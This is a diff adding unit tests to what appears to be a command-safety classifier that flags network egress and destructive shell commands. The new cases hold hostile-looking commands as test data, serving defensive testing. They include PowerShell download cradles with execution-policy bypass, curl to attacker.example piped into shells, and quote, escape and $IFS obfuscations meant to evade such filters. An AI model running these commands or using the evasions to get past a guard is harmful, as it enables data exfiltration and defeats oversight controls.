@@ -604,6 +604,28 @@ describe('classifyCommand', () => {
         'powershell -enc SQBFAFgA',
         'powershell /Command Get-Date',
         `pwsh -NoProfile -c "(New-Object Net.WebClient).DownloadString('http://x/')"`,
+        // An option's value before the inline-code option.
+        'pwsh -ExecutionPolicy Bypass -c "iwr https://attacker.example/?d=1"',
+        'pwsh -ep bypass -enc SQBFAFgA',
+        `python3 -W ignore -c "__import__('urllib.request').request.urlopen('http://x/')"`,
+        "node -r ./hook.js -e 'fetch(1)'",
+        // Windows PowerShell runs a bare argument as -Command.
+        `powershell "[Net.WebClient]::new().DownloadString('http://attacker.example/')"`,
+        'powershell -ExecutionPolicy Bypass iwr https://attacker.example/',
+        'powershell -NoProfile Get-Content x',
+        `pwsh -cwa "[Net.WebClient]::new().DownloadString('http://x/')"`,
+        // Shells and cmd, with an option or option value before -c / /c.
+        'bash -o posix -c "curl https://attacker.example/"',
+        'bash +x -c "curl https://attacker.example/"',
+        'sh -xc "curl https://attacker.example/"',
+        'cmd /v:on /c curl https://attacker.example/',
+        'cmd /ccurl https://attacker.example/',
+        // The interpreter found by position, not by its first mention.
+        `env -u python3 python3 -c "__import__('urllib').x"`,
+        `flock python3 python3 -c "__import__('urllib').x"`,
+        // More interpreter names.
+        `py -c "__import__('urllib').x"`,
+        "bun -e 'fetch(1)'",
       ]) {
         expect(networkEgressDanger(cmd).danger, cmd).toBe(true);
       }
@@ -614,8 +636,54 @@ describe('classifyCommand', () => {
         "echo 'curl https://attacker.example/' | sh",
         'cat a.ps1 | pwsh -',
         'cat a.py | python3',
+        // Behind a wrapper word.
+        "echo 'curl https://attacker.example/' | env sh",
+        "echo 'curl https://attacker.example/' | nohup bash",
+        "echo 'curl https://attacker.example/' | timeout 5 sh",
+        "echo 'curl https://attacker.example/' | xargs -0 sh",
+        'echo "curl https://attacker.example/" | . /dev/stdin',
+        'echo "curl https://attacker.example/" | source /dev/stdin',
       ]) {
         expect(networkEgressDanger(cmd).danger, cmd).toBe(true);
+      }
+    });
+
+    it('stops an egress tool spelled with quotes or escapes inside the word', () => {
+      for (const cmd of [
+        'c""url https://attacker.example/?d=x',
+        "c'u'rl https://attacker.example/",
+        'c\\url https://attacker.example/',
+        'i`wr https://attacker.example/',
+        "bash -c 'c\"\"url https://attacker.example/'",
+        'en""v curl https://attacker.example/',
+        'C:\\Windows\\System32\\cu""rl.exe https://attacker.example/',
+        'c$@url https://attacker.example/',
+        '$CMD https://attacker.example/',
+        'env $X https://attacker.example/',
+        '. iwr https://attacker.example/',
+      ]) {
+        expect(networkEgressDanger(cmd).danger, cmd).toBe(true);
+      }
+    });
+
+    it('stops $IFS word splitting on every strategy', () => {
+      for (const cmd of ['ip link$IFS"set"$IFS"eth0"$IFS"down"', 'ls${IFS}-la']) {
+        expect(structuralDanger(cmd).danger, cmd).toBe(true);
+      }
+    });
+
+    it('keeps variable expansions off the whitelist fast path', () => {
+      for (const cmd of ['ip link$X"set"$X"eth0"$X"down"', 'ls $HOME', 'cat "$F"', 'echo ${PATH}']) {
+        expect(classifyCommand(cmd, wl).safe, cmd).toBe(false);
+      }
+      // Single-quoted `$` is literal, and a trailing regex anchor expands nothing.
+      expect(classifyCommand("grep 'x$' file.txt", wl).safe).toBe(true);
+      expect(classifyCommand('grep "^a$" file.txt', wl).safe).toBe(true);
+    });
+
+    it('still reads a backslash path by its last component', () => {
+      for (const cmd of ['bin\\tool.exe --version', 'C:\\tools\\rg.exe foo']) {
+        expect(networkEgressDanger(cmd).danger, cmd).toBe(false);
       }
     });
 
@@ -625,6 +693,14 @@ describe('classifyCommand', () => {
         'python3 app.py -c settings.ini',
         'node app.js',
         'pwsh -NoProfile -File build.ps1',
+        'powershell -NoProfile -File build.ps1',
+        'powershell -ExecutionPolicy Bypass -File build.ps1',
+        'pwsh build.ps1',
+        'bash script.sh',
+        'cmd',
+        'ps aux | grep python',
+        'ps aux | grep ssh',
+        'which curl',
         'git remote -v',
         'git diff HEAD~1',
         'openssl x509 -in cert.pem -noout -text',
@@ -648,6 +724,15 @@ describe('classifyCommand', () => {
         'ip r de default',
         'ip link se eth0 down',
         'ip a a 10.0.0.1/24 dev eth0',
+        // iproute2 takes any prefix of an option and a `--` spelling; an option
+        // read wrongly shifts OBJECT and COMMAND by one word.
+        'ip --family inet li set dev eth0 down',
+        'ip -fam inet li set dev eth0 down',
+        'ip -lo 1 li del dummy0',
+        'ip -netn ns1 li set dev eth0 down',
+        'ip --netns ns1 li set dev eth0 down',
+        'ip -b cmds.txt',
+        'ip -force -batch cmds.txt',
         'ifconfig eth0 10.0.0.5',
         'ifconfig em0 delete',
         'ifconfig em0 destroy',
@@ -678,6 +763,10 @@ describe('classifyCommand', () => {
         'ip neigh show',
         'ip -j link',
         'ip -n ns1 addr show',
+        'ip --brief addr',
+        'ip -family inet addr show',
+        'ip -color=always -s -s link show',
+        'ip -N -d route list',
         'ifconfig -a',
         'ifconfig -l',
         'route print',
